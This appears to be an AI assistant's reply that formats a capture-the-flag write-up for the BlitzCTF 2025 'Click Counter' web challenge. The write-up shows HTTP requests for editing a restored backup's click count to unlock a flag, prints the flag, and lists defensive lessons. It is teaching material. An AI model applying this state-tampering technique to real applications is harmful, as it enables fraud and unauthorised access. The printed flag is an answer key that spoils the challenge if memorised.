Here's your writeup **converted into a clean GitHub-compatible Markdown file** named `click-counter.md`. You can copy-paste it directly into a new `.md` file in your GitHub repo:

````markdown
# 🖱️ CTF Writeup: Click Counter - BlitzHack (BlitzCTF 2025)

**Category:** Web  
**Challenge Type:** Clicker-style web app  
**Flag Format:** `Blitz{...}`  
**Flag:** `Blitz{N3x7js_M1ddl3w4r3_Byyyyp4sssssss}`

---

## 🧩 Challenge Summary

We were given a clicker-style web application with features like:

- A click counter (with cooldown)  
- Ability to "Save" progress  
- Options to "Create Backup" and "Restore Backup"  
- A hidden "Buy Flag" button in the Settings panel  

The `/buy` page displayed:

- Flag price: **9999**  
- Current click count (loaded from session cookie)  
- A "Buy Now" button → Sends a POST to `/buy_item`

### 🎯 Objective

Buy the flag using clicks. But manually reaching 9999 clicks is impractical — we needed to **shortcut it via a vulnerability**.

---

## 🛠️ Step-by-Step Exploit

### 1️⃣ Saving Clicks – Session Cookie Observed

```http
POST /save
Content-Type: application/json
Cookie: session=eyJjbGlja3MiOjV9...

Payload:
{"clicks": 5}
````

✅ **Insight:** The session is a Base64-encoded JSON storing click count — this is a client-side session.

---

### 2️⃣ Trying to Buy the Flag

```http
POST /buy_item
Cookie: session=eyJjbGlja3MiOjV9...

Payload:
{"buy_item": "Flag"}
```

🔁 **Response:**

```json
{"message": "Insufficient Funds", "success": false}
```

---

### 3️⃣ Attempting Direct Backup Abuse

```http
POST /restore_backup
Content-Type: application/json

Payload:
{"clicks": 99999}
```

🚫 **Response:**

```json
{"error": "Invalid backup data."}
```

---

### 4️⃣ Create Legit Backup via UI

From the UI:
**Settings → Create Backup**
This downloaded `backup.json` (snipped):

```json
{
  "session_data": {
    "clicks_data": {
      "clickStore": 5,
      "currency": "tokens"
    }
  }
}
```

✅ **Insight:** `clickStore` is the internal variable used to restore the session click count.

---

### 5️⃣ Modify and Restore Backup

We modified `clickStore`:

```json
"clickStore": 99999
```

Then restored it via:
**Settings → Restore Backup**

➡️ New session cookie:

```js
Set-Cookie: session=eyJjbGlja3MiOjk5OTk5fQ...
```

---

### 6️⃣ Buy Flag Again (Now We Have Enough Clicks)

```http
POST /buy_item
Cookie: session=eyJjbGlja3MiOjk5OTk5fQ...

Payload:
{"buy_item":"Flag"}
```

✅ **Response:**

```json
{
  "message": "Welcome to the Admin Dashboard of BlitzHack\nYou are logged in as: admin\n\nFlag\nBlitz{N3x7js_M1ddl3w4r3_Byyyyp4sssssss}",
  "success": true
}
```

---

### 💡 Why This Worked

* `clickStore` is used to reconstruct the session cookie
* No validation was done after restoring the backup
* Backend logic likely:

```python
if clicks >= 9999:
    return admin_dashboard_and_flag()
```

---

## 🚨 Lessons Learned

* Never trust user-controlled backup data
* Don’t store sensitive data (like roles or click counts) in client-side cookies
* Signed cookies aren’t safe if internal values can be modified indirectly

---

## 🏁 Final Flag

```text
Blitz{N3x7js_M1ddl3w4r3_Byyyyp4sssssss}
```

```

---
